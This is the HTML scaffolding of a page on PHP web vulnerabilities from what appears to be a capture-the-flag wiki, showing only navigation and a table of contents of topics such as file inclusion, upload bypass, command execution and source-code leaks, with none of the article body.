
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <meta name="author" content="anakilivo">
      
      
      <link rel="shortcut icon" href="../../assets/horde.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.7">
    
    
      
        <title>PHP - Horde Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.cb6bc1d0.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.39b8e14a.min.css">
        
          
          
          <meta name="theme-color" content="#ef5552">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="">
      
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#file-contains" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="../.." title="Horde Wiki" class="md-header-nav__button md-logo" aria-label="Horde Wiki">
      
  <img src="../../assets/horde.png" alt="logo">

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      <div class="md-header-nav__ellipsis">
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            Horde Wiki
          </span>
        </div>
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            
              PHP
            
          </span>
        </div>
      </div>
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/anakilivo/wiki/" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM277.3 415.7c-8.4 1.5-11.5-3.7-11.5-8 0-5.4.2-33 .2-55.3 0-15.6-5.2-25.5-11.3-30.7 37-4.1 76-9.2 76-73.1 0-18.2-6.5-27.3-17.1-39 1.7-4.3 7.4-22-1.7-45-13.9-4.3-45.7 17.9-45.7 17.9-13.2-3.7-27.5-5.6-41.6-5.6-14.1 0-28.4 1.9-41.6 5.6 0 0-31.8-22.2-45.7-17.9-9.1 22.9-3.5 40.6-1.7 45-10.6 11.7-15.6 20.8-15.6 39 0 63.6 37.3 69 74.3 73.1-4.8 4.3-9.1 11.7-10.6 22.3-9.5 4.3-33.8 11.7-48.3-13.9-9.1-15.8-25.5-17.1-25.5-17.1-16.2-.2-1.1 10.2-1.1 10.2 10.8 5 18.4 24.2 18.4 24.2 9.7 29.7 56.1 19.7 56.1 19.7 0 13.9.2 36.5.2 40.6 0 4.3-3 9.5-11.5 8-66-22.1-112.2-84.9-112.2-158.3 0-91.8 70.2-161.5 162-161.5S388 165.6 388 257.4c.1 73.4-44.7 136.3-110.7 158.3zm-98.1-61.1c-1.9.4-3.7-.4-3.9-1.7-.2-1.5 1.1-2.8 3-3.2 1.9-.2 3.7.6 3.9 1.9.3 1.3-1 2.6-3 3zm-9.5-.9c0 1.3-1.5 2.4-3.5 2.4-2.2.2-3.7-.9-3.7-2.4 0-1.3 1.5-2.4 3.5-2.4 1.9-.2 3.7.9 3.7 2.4zm-13.7-1.1c-.4 1.3-2.4 1.9-4.1 1.3-1.9-.4-3.2-1.9-2.8-3.2.4-1.3 2.4-1.9 4.1-1.5 2 .6 3.3 2.1 2.8 3.4zm-12.3-5.4c-.9 1.1-2.8.9-4.3-.6-1.5-1.3-1.9-3.2-.9-4.1.9-1.1 2.8-.9 4.3.6 1.3 1.3 1.8 3.3.9 4.1zm-9.1-9.1c-.9.6-2.6 0-3.7-1.5s-1.1-3.2 0-3.9c1.1-.9 2.8-.2 3.7 1.3 1.1 1.5 1.1 3.3 0 4.1zm-6.5-9.7c-.9.9-2.4.4-3.5-.6-1.1-1.3-1.3-2.8-.4-3.5.9-.9 2.4-.4 3.5.6 1.1 1.3 1.3 2.8.4 3.5zm-6.7-7.4c-.4.9-1.7 1.1-2.8.4-1.3-.6-1.9-1.7-1.5-2.6.4-.6 1.5-.9 2.8-.4 1.3.7 1.9 1.8 1.5 2.6z"/></svg>
  </div>
  <div class="md-source__repository">
    anakilivo/wiki
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    




<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Horde Wiki" class="md-nav__button md-logo" aria-label="Horde Wiki">
      
  <img src="../../assets/horde.png" alt="logo">

    </a>
    Horde Wiki
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/anakilivo/wiki/" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM277.3 415.7c-8.4 1.5-11.5-3.7-11.5-8 0-5.4.2-33 .2-55.3 0-15.6-5.2-25.5-11.3-30.7 37-4.1 76-9.2 76-73.1 0-18.2-6.5-27.3-17.1-39 1.7-4.3 7.4-22-1.7-45-13.9-4.3-45.7 17.9-45.7 17.9-13.2-3.7-27.5-5.6-41.6-5.6-14.1 0-28.4 1.9-41.6 5.6 0 0-31.8-22.2-45.7-17.9-9.1 22.9-3.5 40.6-1.7 45-10.6 11.7-15.6 20.8-15.6 39 0 63.6 37.3 69 74.3 73.1-4.8 4.3-9.1 11.7-10.6 22.3-9.5 4.3-33.8 11.7-48.3-13.9-9.1-15.8-25.5-17.1-25.5-17.1-16.2-.2-1.1 10.2-1.1 10.2 10.8 5 18.4 24.2 18.4 24.2 9.7 29.7 56.1 19.7 56.1 19.7 0 13.9.2 36.5.2 40.6 0 4.3-3 9.5-11.5 8-66-22.1-112.2-84.9-112.2-158.3 0-91.8 70.2-161.5 162-161.5S388 165.6 388 257.4c.1 73.4-44.7 136.3-110.7 158.3zm-98.1-61.1c-1.9.4-3.7-.4-3.9-1.7-.2-1.5 1.1-2.8 3-3.2 1.9-.2 3.7.6 3.9 1.9.3 1.3-1 2.6-3 3zm-9.5-.9c0 1.3-1.5 2.4-3.5 2.4-2.2.2-3.7-.9-3.7-2.4 0-1.3 1.5-2.4 3.5-2.4 1.9-.2 3.7.9 3.7 2.4zm-13.7-1.1c-.4 1.3-2.4 1.9-4.1 1.3-1.9-.4-3.2-1.9-2.8-3.2.4-1.3 2.4-1.9 4.1-1.5 2 .6 3.3 2.1 2.8 3.4zm-12.3-5.4c-.9 1.1-2.8.9-4.3-.6-1.5-1.3-1.9-3.2-.9-4.1.9-1.1 2.8-.9 4.3.6 1.3 1.3 1.8 3.3.9 4.1zm-9.1-9.1c-.9.6-2.6 0-3.7-1.5s-1.1-3.2 0-3.9c1.1-.9 2.8-.2 3.7 1.3 1.1 1.5 1.1 3.3 0 4.1zm-6.5-9.7c-.9.9-2.4.4-3.5-.6-1.1-1.3-1.3-2.8-.4-3.5.9-.9 2.4-.4 3.5.6 1.1 1.3 1.3 2.8.4 3.5zm-6.7-7.4c-.4.9-1.7 1.1-2.8.4-1.3-.6-1.9-1.7-1.5-2.6.4-.6 1.5-.9 2.8-.4 1.3.7 1.9 1.8 1.5 2.6z"/></svg>
  </div>
  <div class="md-source__repository">
    anakilivo/wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" >
      
      <label class="md-nav__link" for="nav-2">
        Misc
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Misc" data-md-level="1">
        <label class="md-nav__title" for="nav-2">
          <span class="md-nav__icon md-icon"></span>
          Misc
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" >
      
      <label class="md-nav__link" for="nav-2-1">
        Archive
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Archive" data-md-level="2">
        <label class="md-nav__title" for="nav-2-1">
          <span class="md-nav__icon md-icon"></span>
          Archive
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/archive/rar" class="md-nav__link">
        Rar
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/archive/zip" class="md-nav__link">
        Zip
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2" >
      
      <label class="md-nav__link" for="nav-2-2">
        Audio
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Audio" data-md-level="2">
        <label class="md-nav__title" for="nav-2-2">
          <span class="md-nav__icon md-icon"></span>
          Audio
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/audio/introduction" class="md-nav__link">
        Introduction
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3" >
      
      <label class="md-nav__link" for="nav-2-3">
        Disc Memory
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Disc Memory" data-md-level="2">
        <label class="md-nav__title" for="nav-2-3">
          <span class="md-nav__icon md-icon"></span>
          Disc Memory
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/disk-memory/introduction" class="md-nav__link">
        Introduction
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4" >
      
      <label class="md-nav__link" for="nav-2-4">
        Encode
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Encode" data-md-level="2">
        <label class="md-nav__title" for="nav-2-4">
          <span class="md-nav__icon md-icon"></span>
          Encode
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/encode/communication" class="md-nav__link">
        Communication
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/encode/encodings" class="md-nav__link">
        Encodings
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/encode/modern" class="md-nav__link">
        Modern
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5" >
      
      <label class="md-nav__link" for="nav-2-5">
        Pictures
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Pictures" data-md-level="2">
        <label class="md-nav__title" for="nav-2-5">
          <span class="md-nav__icon md-icon"></span>
          Pictures
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/pictures/introduction" class="md-nav__link">
        Introduction
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/pictures/jpg" class="md-nav__link">
        JPG (JPEG)
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/pictures/png" class="md-nav__link">
        PNG
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/pictures/gif" class="md-nav__link">
        GIF
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6" >
      
      <label class="md-nav__link" for="nav-2-6">
        Other
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Other" data-md-level="2">
        <label class="md-nav__title" for="nav-2-6">
          <span class="md-nav__icon md-icon"></span>
          Other
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../misc/other/pyc" class="md-nav__link">
        Pyc
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
      
      <label class="md-nav__link" for="nav-3">
        Web
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Web" data-md-level="1">
        <label class="md-nav__title" for="nav-3">
          <span class="md-nav__icon md-icon"></span>
          Web
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../introduction" class="md-nav__link">
        Introduction
      </a>
    </li>
  

          
            
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          PHP
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="" class="md-nav__link md-nav__link--active">
        PHP
      </a>
      
        
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#file-contains" class="md-nav__link">
    File contains
  </a>
  
    <nav class="md-nav" aria-label="File contains">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#a-local-file-contains" class="md-nav__link">
    A local file contains
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-file-contains" class="md-nav__link">
    Remote file contains
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#file-upload" class="md-nav__link">
    File Upload
  </a>
  
    <nav class="md-nav" aria-label="File Upload">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#bypassing-the-upload-check" class="md-nav__link">
    Bypassing the upload check
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#variable-coverage" class="md-nav__link">
    Variable coverage
  </a>
  
    <nav class="md-nav" aria-label="Variable coverage">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#global-variable-override" class="md-nav__link">
    Global Variable Override
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#extract-variable-override" class="md-nav__link">
    extract() variable override
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#import_request_variables-variable-override" class="md-nav__link">
    import_request_variables Variable Override
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#parse_str-variable-override" class="md-nav__link">
    parse_str() variable override
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#command-execution" class="md-nav__link">
    Command Execution
  </a>
  
    <nav class="md-nav" aria-label="Command Execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#direct-execution-code" class="md-nav__link">
    Direct execution code
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_replace-code-execution" class="md-nav__link">
    preg_replace() Code Execution
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#preg_match-code-execution" class="md-nav__link">
    preg_match Code Execution
  </a>
  
    <nav class="md-nav" aria-label="preg_match Code Execution">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#construct-_get-read" class="md-nav__link">
    Construct _GET read
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-the-_get-parameter" class="md-nav__link">
    Get the _GET parameter
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#incoming-parameters" class="md-nav__link">
    Incoming parameters
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#dynamic-function-execution" class="md-nav__link">
    Dynamic function execution
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#backquote-command-execution" class="md-nav__link">
    Backquote command execution
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#curly-syntax" class="md-nav__link">
    Curly Syntax
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#callback" class="md-nav__link">
    Callback
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#deserialization" class="md-nav__link">
    Deserialization
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#php-features" class="md-nav__link">
    PHP Features
  </a>
  
    <nav class="md-nav" aria-label="PHP Features">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#array" class="md-nav__link">
    Array
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#magic-hash" class="md-nav__link">
    Magic Hash
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hex-conversion" class="md-nav__link">
    Hex conversion
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#type-conversion" class="md-nav__link">
    Type conversion
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#looseness-of-parameters-of-built-in-functions" class="md-nav__link">
    Looseness of parameters of built-in functions
  </a>
  
    <nav class="md-nav" aria-label="Looseness of parameters of built-in functions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#md5" class="md-nav__link">
    md5()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#strcmp" class="md-nav__link">
    strcmp()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#switch" class="md-nav__link">
    switch()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#in_array" class="md-nav__link">
    in_array()
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#looking-for-source-code-backup" class="md-nav__link">
    Looking for source code backup
  </a>
  
    <nav class="md-nav" aria-label="Looking for source code backup">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hg-source-code-leak" class="md-nav__link">
    hg Source code leak
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#git-source-leaks" class="md-nav__link">
    Git Source leaks
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ds_store-file-leaked" class="md-nav__link">
    .DS_Store File leaked
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#website-backup-file" class="md-nav__link">
    Website backup file
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#svn-leak" class="md-nav__link">
    SVN Leak
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-inf-webxml-leaked" class="md-nav__link">
    WEB-INF / web.xml leaked
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cvs-leak" class="md-nav__link">
    CVS Leak
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../sqli" class="md-nav__link">
        Sqli
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../xss" class="md-nav__link">
        XSS
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../ssrf" class="md-nav__link">
        SSRF
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../csrf" class="md-nav__link">
        CSRF
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" >
      
      <label class="md-nav__link" for="nav-4">
        Crypto
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Crypto" data-md-level="1">
        <label class="md-nav__title" for="nav-4">
          <span class="md-nav__icon md-icon"></span>
          Crypto
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/introduction" class="md-nav__link">
        Introduction
      </a>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2" type="checkbox" id="nav-4-2" >
      
      <label class="md-nav__link" for="nav-4-2">
        Asymmetric
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Asymmetric" data-md-level="2">
        <label class="md-nav__title" for="nav-4-2">
          <span class="md-nav__icon md-icon"></span>
          Asymmetric
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-1" type="checkbox" id="nav-4-2-1" >
      
      <label class="md-nav__link" for="nav-4-2-1">
        Lattice
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Lattice" data-md-level="3">
        <label class="md-nav__title" for="nav-4-2-1">
          <span class="md-nav__icon md-icon"></span>
          Lattice
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/lattice/introduction" class="md-nav__link">
        Introduction
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/lattice/overview" class="md-nav__link">
        Overview
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/lattice/lattice-reduction" class="md-nav__link">
        Lattice reduction
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/lattice/cvp" class="md-nav__link">
        CVP
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-2" type="checkbox" id="nav-4-2-2" >
      
      <label class="md-nav__link" for="nav-4-2-2">
        Discrete Log
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Discrete Log" data-md-level="3">
        <label class="md-nav__title" for="nav-4-2-2">
          <span class="md-nav__icon md-icon"></span>
          Discrete Log
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/discrete-log/introduction" class="md-nav__link">
        Introduction
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/discrete-log/elgamal" class="md-nav__link">
        ElGamal
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/discrete-log/ecc" class="md-nav__link">
        ECC
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4-2-3" type="checkbox" id="nav-4-2-3" >
      
      <label class="md-nav__link" for="nav-4-2-3">
        Rsa
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="Rsa" data-md-level="3">
        <label class="md-nav__title" for="nav-4-2-3">
          <span class="md-nav__icon md-icon"></span>
          Rsa
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/rsa/introduction" class="md-nav__link">
        Introduction
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/rsa/side.channel" class="md-nav__link">
        Channel Attack
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/rsa/module.attack" class="md-nav__link">
        Module Attacks
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/rsa/e.attack" class="md-nav__link">
        Public exponent attacks
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/rsa/d.attack" class="md-nav__link">
        Private exponent attacks
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/asymmetric/knapsack" class="md-nav__link">
        Knapsack
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#file-contains" class="md-nav__link">
    File contains
  </a>
  
    <nav class="md-nav" aria-label="File contains">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#a-local-file-contains" class="md-nav__link">
    A local file contains
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-file-contains" class="md-nav__link">
    Remote file contains
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#file-upload" class="md-nav__link">
    File Upload
  </a>
  
    <nav class="md-nav" aria-label="File Upload">
